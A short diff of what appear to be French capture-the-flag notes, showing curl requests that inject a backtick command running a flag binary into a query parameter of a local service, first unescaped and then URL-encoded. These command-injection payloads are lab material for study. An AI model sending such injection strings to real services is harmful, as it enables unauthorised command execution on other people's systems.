@@ -33,7 +33,7 @@ ln -s /bin/getflag /tmp/GETFLAG
 #ne marche pas
 /*/GETFLAG
 
-curl '192.168.1.27:4646?x=`/*/GETFLAG>&2`'
+curl 'localhost:4646?x=`/*/GETFLAG>&2`'
 > ne marche pas car les caracteres ne sont pas echappe comme sur les url
 
 curl 'localhost:4646?x=`%2F%2A%2FGETFLAG%3E%262`'
